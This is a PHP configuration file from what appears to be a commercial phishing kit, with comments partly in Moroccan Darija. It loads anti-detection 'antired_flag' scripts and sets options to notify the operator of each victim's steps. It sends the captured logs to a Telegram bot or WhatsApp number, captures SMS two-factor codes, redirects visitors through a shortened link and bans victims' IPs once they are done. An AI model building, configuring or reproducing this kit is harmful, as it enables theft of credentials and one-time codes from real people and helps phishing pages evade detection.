<?php

include "../antired_flag/anti1.php";
include "../antired_flag/anti2.php"; 
include "../antired_flag/anti3.php"; 
include "../antired_flag/anti4.php"; 
include "../antired_flag/anti5.php"; 
include "../antired_flag/anti7.php";
// ---------------------------------------------------------------------------------- 
    $get_notification = 'no'; // get notification victim steps
    $show_capatcha = "";  // avaible in premium plan only |  'witout antibots antiredflags'  
	$newvictims = "yes"; // If you want to receive anyone click url  | ila bghiti ay victims twslk notification fach ydkhl
    $redirection = "https://s.id/1ssAG"; //  redirection 
    $redirection_ban = "https://s.id/1ssAG"; //  redirection banned ip
    $name_text = ""; // Enter Your Name or anythings exmple : uysnx_logs.txt  | if empty i'ts default UysnX_logs.txt
	$verification_sms = "yes"; // To activate the 2fa feature | ila bghiti t 2activer 2fa
    $verification_google = "no"; // To activate the 2fa google | ila bghiti t 2activer 2fa d google || not avaible now !
// ----------------------------------------------------------------------------------   
    $send_to_telegram = "yes";
    $api = "your-token"; // Bot Token API 
    $chatid = 11111; // Chat ID 
// ----------------------------------------------------------------------------------
    $send_to_Whatsapp = "no"; 
    $key_whatsapp = '';
    $number = '+212688482710'; 
// ----------------------------------------------------------------------------------
    $save_in_text = "no";  // save logs in text
// ----------------------------------------------------------------------------------
    $ban_ip = "no"; // If you complete the victim, prevent her from entering again
// ----------------------------------------------------------------------------------
?>